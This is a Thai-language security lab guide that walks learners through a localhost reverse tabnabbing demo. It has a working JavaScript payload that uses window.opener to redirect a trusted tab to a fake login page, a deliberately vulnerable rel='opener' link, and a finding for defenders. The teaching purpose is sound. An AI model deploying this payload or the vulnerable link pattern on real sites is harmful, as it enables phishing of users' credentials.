# Part 1 — Hacker Playbook

บทนี้เริ่มจาก External Partner Site ที่ยังเป็นเว็บปกติ จากนั้นจำลองว่า Hacker ได้รับอนุญาตให้ควบคุม Source ของเว็บนั้น เพิ่ม JavaScript Payload, rebuild Container และใช้เว็บที่แก้ไขแล้วทดสอบ Trusted Site

> [!WARNING]
> แก้ไขและทดสอบเฉพาะไฟล์ใน `demo/external-site` ของ Lab นี้ ใช้ Credential สมมติ และห้ามนำ Payload ไปใช้กับระบบที่ไม่ได้รับอนุญาต

## Objective

ทำให้ผู้เรียนเห็นงานของ Hacker ครบวงจร:

1. ตรวจสถานะ Partner Site ก่อนแก้ไข
2. เพิ่ม Hacker Console และ Payload ใน External Site
3. Rebuild และ Redeploy External Site Container
4. ตรวจ `window.opener` และสาธิต Reverse Tabnabbing
5. เก็บหลักฐานและส่ง Finding ให้ Defender

## Scope และ Architecture

| ระบบ | URL | Source ที่เกี่ยวข้อง |
| --- | --- | --- |
| Trusted Site | <http://localhost:8100> | `demo/trusted-site/portal.html` |
| External Site | <http://localhost:9100> | `demo/external-site/index.html` และ `hacker.js` ที่จะสร้าง |

ตรวจสอบว่า Container พร้อมก่อนเริ่ม:

```bash
podman compose ps
```

## Preconditions

- Trusted Site เปิด External Site ด้วย `target="_blank"` และ `rel="opener"`
- Hacker ได้รับอนุญาตให้แก้ Source และ rebuild External Site ใน Lab
- ผู้ใช้เปิด External Site ผ่านลิงก์จาก Trusted Site
- Browser อนุญาตให้หน้าใหม่ได้รับ `window.opener` ตามที่ Lab กำหนด

เพียงพบ External Link ยังไม่ถือว่าโจมตีได้ Hacker ต้องควบคุมหรือสามารถรัน JavaScript ที่ปลายทางก่อน

## 1. เก็บ Baseline ก่อน Hacker แก้ Code

1. เปิด <http://localhost:9100> โดยตรง
2. ยืนยันว่าเห็นหน้า Orbit Security Labs แบบปกติ
3. ยืนยันว่าไม่มี Hacker Console, Countdown หรือ Redirect
4. เปิด DevTools Console และยืนยันว่าไม่มี Error จาก Payload

สถานะนี้สื่อว่า Partner Site ยังไม่ถูกควบคุม และการมีลิงก์จาก Trusted Site เพียงอย่างเดียวยังไม่ทำให้เกิดการโจมตี

## 2. จำลองว่า Hacker ควบคุม External Site

เปิดไฟล์ `demo/external-site/index.html` แล้วเพิ่ม Panel ต่อไปนี้ไว้ภายใน `<main>` ก่อนปิด `</main>`:

```html
<section id="hacker-lab" class="grid">
  <aside class="card status-panel span-12">
    <div class="status-row">
      <div>
        <p class="eyebrow">Hacker console</p>
        <h2>Opener probe</h2>
      </div>
      <span id="probe-pill" class="pill warning">Checking…</span>
    </div>

    <p id="probe-message" class="muted" aria-live="polite">
      กำลังตรวจสอบ reference กลับไปยัง Trusted Site
    </p>
    <p id="countdown" class="countdown"></p>
  </aside>
</section>
```

จากนั้นเพิ่ม Script tag ก่อนปิด `</body>`:

```html
<script src="/hacker.js"></script>
```

ขั้นตอนนี้เปลี่ยนหน้า Partner ปกติให้มีส่วนแสดงผลสำหรับการตรวจสอบของ Hacker แต่ยังต้องสร้าง JavaScript ที่ทำงานจริง

## 3. สร้าง JavaScript Payload

สร้างไฟล์ `demo/external-site/hacker.js` แล้วเพิ่ม Code:

```js
const pill = document.querySelector("#probe-pill");
const message = document.querySelector("#probe-message");
const countdown = document.querySelector("#countdown");
const hasOpener = Boolean(window.opener && !window.opener.closed);

if (!hasOpener) {
  pill.className = "pill";
  pill.textContent = "BLOCKED";
  message.textContent = "ไม่พบ window.opener";
  countdown.textContent = "Payload หยุดทำงาน";
} else {
  pill.className = "pill danger";
  pill.textContent = "EXPOSED";
  message.textContent = "พบ window.opener — อ้างอิงกลับไปยัง Trusted Tab ได้";

  let seconds = 5;
  countdown.textContent = `จะเปลี่ยน Trusted Tab ใน ${seconds} วินาที`;

  const timer = window.setInterval(() => {
    seconds -= 1;

    if (seconds === 0) {
      window.clearInterval(timer);
      const phishingUrl = new URL(
        "/session-expired.html",
        window.location.href
      );
      window.opener.location.href = phishingUrl.href;
      countdown.textContent = "Payload ทำงานแล้ว — กลับไปดู Trusted Tab";
      return;
    }

    countdown.textContent = `จะเปลี่ยน Trusted Tab ใน ${seconds} วินาที`;
  }, 1000);
}
```

Code แบ่งเป็นสองเส้นทาง:

- ถ้าไม่พบ `window.opener` จะแสดง `BLOCKED` และหยุดทำงาน
- ถ้าพบ `window.opener` จะแสดง `EXPOSED`, นับถอยหลัง และเปลี่ยน Trusted Tab ไปยังหน้า Login ปลอม

## 4. Rebuild External Site

การแก้ Source บน Host ยังไม่เปลี่ยน Container ที่กำลังรัน เพราะไฟล์ถูก `COPY` เข้า Image ตอน Build ให้ rebuild เฉพาะ External Site:

```bash
podman compose up -d --build external-site
podman compose ps
```

เปิด <http://localhost:9100> โดยตรงอีกครั้ง ควรเห็น Hacker Console แต่สถานะเป็น `BLOCKED` เพราะหน้าเว็บไม่ได้ถูกเปิดผ่าน Trusted Site และไม่มี `window.opener`

นี่เป็น Negative Test ที่ยืนยันว่า Payload ต้องอาศัย Preconditions ไม่ได้ทำงานกับทุกกรณี

## 5. เก็บ Baseline ของ Trusted Login

1. เปิด <http://localhost:8100>
2. ยืนยันว่า Address Bar แสดง Port `8100`
3. สังเกตชื่อ KOPE CloudOps, Layout และข้อความของหน้า Login จริง
4. ใช้ข้อมูลสมมติเข้าสู่หน้า Portal
5. ยืนยันว่า URL เป็น `/portal.html` และยังอยู่บน Port `8100`

## 6. ตรวจ Vulnerable Link

ในหน้า Portal ตรวจลิงก์ **อ่านบทความจาก Partner**:

```html
<a href="http://localhost:9100/"
   target="_blank"
   rel="opener">
```

`rel="opener"` จงใจคง Reference กลับมายัง Trusted Tab สำหรับ Lab

## 7. Execute Attack ใน Lab

1. กด **อ่านบทความจาก Partner** จากหน้า Portal
2. ยืนยันว่าแท็บใหม่อยู่ที่ Port `9100`
3. Hacker Console ควรแสดง `EXPOSED`
4. เปิด DevTools Console ของ External Site แล้วรัน:

```js
Boolean(window.opener)
```

ผลที่คาดหวังก่อน Defender แก้ไข:

```text
true
```

5. รอให้ Countdown สิ้นสุด
6. กลับไปยัง Trusted Tab เดิม
7. ยืนยันว่า URL เปลี่ยนจาก Port `8100` เป็น `9100/session-expired.html`
8. เปรียบเทียบหน้า Login ปลอมกับหน้า Login จริง

## 8. อธิบายผลกระทบอย่างถูกต้อง

Hacker ไม่สามารถอ่าน DOM, Cookie หรือ JavaScript state ของ Trusted Site เพราะทั้งสองเว็บไซต์เป็นคนละ Origin แต่ Browser ยังอนุญาตให้ External Site สั่ง Navigation ของ `window.opener` ไปยัง URL ใหม่ได้ในเงื่อนไขของ Lab

Finding นี้จึงพิสูจน์การเปลี่ยน Trusted Tab ไปยังหน้า Phishing ไม่ใช่การอ่านข้อมูลภายใน Trusted Site โดยตรง

### จุดสังเกต Login จริงกับ Login ปลอม

| สัญญาณ | Login จริง | Login ปลอม |
| --- | --- | --- |
| Origin | `localhost:8100` | `localhost:9100` |
| จังหวะ | ผู้ใช้เปิดหน้า Login เอง | ปรากฏขึ้นหลังเปิดเว็บ Partner |
| ข้อความ | เข้าสู่ระบบตามปกติ | อ้างว่า Session หมดอายุและเร่งให้กรอกซ้ำ |
| รูปลักษณ์ | UI ของระบบจริง | เลียนแบบสี โลโก้ และ Layout ได้ |

## Evidence checklist

- [ ] ภาพ Partner Site ก่อน Hacker แก้ Code
- [ ] Diff ของ `index.html` และไฟล์ `hacker.js` ที่ Hacker สร้าง
- [ ] ผล rebuild ของ External Site Container
- [ ] Hacker Console แสดง `BLOCKED` เมื่อเปิด Port `9100` โดยตรง
- [ ] Source ของลิงก์ที่มี `target="_blank"` และ `rel="opener"`
- [ ] Hacker Console แสดง `EXPOSED` เมื่อเปิดผ่าน Trusted Site
- [ ] ผล `Boolean(window.opener) === true`
- [ ] URL ของ Trusted Tab ก่อนและหลัง Payload ทำงาน
- [ ] ภาพเปรียบเทียบ Login จริงกับ Login ปลอม
- [ ] Browser และ Version ที่ใช้ทดสอบ

## Finding สำหรับส่งให้ Defender

```markdown
### Reverse Tabnabbing via external partner link

#### Preconditions
Attacker must be able to execute JavaScript on the external partner origin,
and the user must open that origin through the vulnerable link.

#### Root cause
Trusted Site explicitly preserves window.opener with rel="opener".

#### Impact
External Site can replace the trusted tab with a phishing page that imitates
the legitimate login experience.

#### Evidence
- Boolean(window.opener) returned true.
- Trusted Tab changed from localhost:8100 to localhost:9100.
- The original link contained target="_blank" and rel="opener".

#### Recommendation
Use rel="noopener noreferrer", rebuild the Trusted Site image, and retest
with the Hacker-modified External Site and the same payload.
```

## ส่งมอบให้ Defender

ส่ง Finding, Evidence และขั้นตอน Reproduce ให้ Defender โดยคง External Site ที่ Hacker แก้ไว้ ห้ามลบ `hacker.js` หรือปรับ Payload เพื่อให้ Retest ผ่าน จากนั้นให้ Defender ใช้ [DEFENDER.md](./DEFENDER.md) แก้เฉพาะ Root Cause ของ Trusted Site
